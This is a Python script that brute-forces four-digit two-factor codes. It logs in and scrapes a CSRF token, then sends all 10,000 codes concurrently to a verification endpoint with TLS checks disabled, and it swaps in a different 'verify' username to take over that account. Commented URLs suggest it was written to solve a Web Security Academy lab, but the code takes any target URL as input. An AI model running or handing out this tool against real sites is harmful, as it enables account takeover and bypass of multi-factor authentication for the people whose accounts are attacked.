import asyncio
import aiohttp
import ssl
from bs4 import BeautifulSoup
from aiohttp import ClientSession, TCPConnector

async def fetch_csrf_token(session, login_url):
    async with session.get(login_url) as response:
        html = await response.text()
        soup = BeautifulSoup(html, 'html.parser')
        csrf_input = soup.find('input', {'name': 'csrf'})
        if csrf_input:
            return csrf_input.get('value')
        else:
            raise ValueError("CSRF token not found in the login page")

async def login(session, login_url, username, password):
    csrf_token = await fetch_csrf_token(session, login_url)
    payload = {
        'username': username,
        'password': password,
        'csrf': csrf_token
    }
    async with session.post(login_url, data=payload) as response:
        if response.status == 200:
            cookies = session.cookie_jar.filter_cookies(login_url)
            return cookies
        else:
            raise Exception(f"Login failed. Status code: {response.status}")

def generate_4_digit_codes():
    return [f"{i:04d}" for i in range(10000)]

async def test_code(session, url, cookie, verify_username, code):
    payload = {
        'mfa-code': code,
        'verify': verify_username
    }
    async with session.post(url, data=payload, cookies=cookie) as response:
        if response.status == 302:
            print(f"Success! Code {code} is valid.")
            return code
        return None

async def brute_force_mfa(login_url, verify_url, username, password, verify_username):
    codes = generate_4_digit_codes()
    sslcontext = ssl.create_default_context()
    sslcontext.check_hostname = False
    sslcontext.verify_mode = ssl.CERT_NONE
    connector = TCPConnector(ssl=sslcontext)

    async with ClientSession(connector=connector) as session:
        cookies = await login(session, login_url, username, password)
        tasks = [test_code(session, verify_url, cookies, verify_username, code) for code in codes]
        results = await asyncio.gather(*tasks)
        valid_code = next((code for code in results if code is not None), None)
        if valid_code:
            print(f"Valid MFA code found: {valid_code}")
        else:
            print("No valid MFA code found.")

if __name__ == "__main__":
    login_url = input("Enter the login URL (e.g., https://example.com/login): ").strip()
    verify_url = input("Enter the 2FA verification URL (e.g., https://example.com/login2): ").strip()
    username = input("Enter the username for login (e.g., carlos): ").strip()
    password = input("Enter the password for login: ").strip()
    verify_username = input("Enter the username to verify (e.g., carlos): ").strip()

    asyncio.run(brute_force_mfa(login_url, verify_url, username, password, verify_username))



    # https://0aa300d2031cf00181f1bc5c002a00ed.web-security-academy.net/login

    # https://0aa300d2031cf00181f1bc5c002a00ed.web-security-academy.net/login2
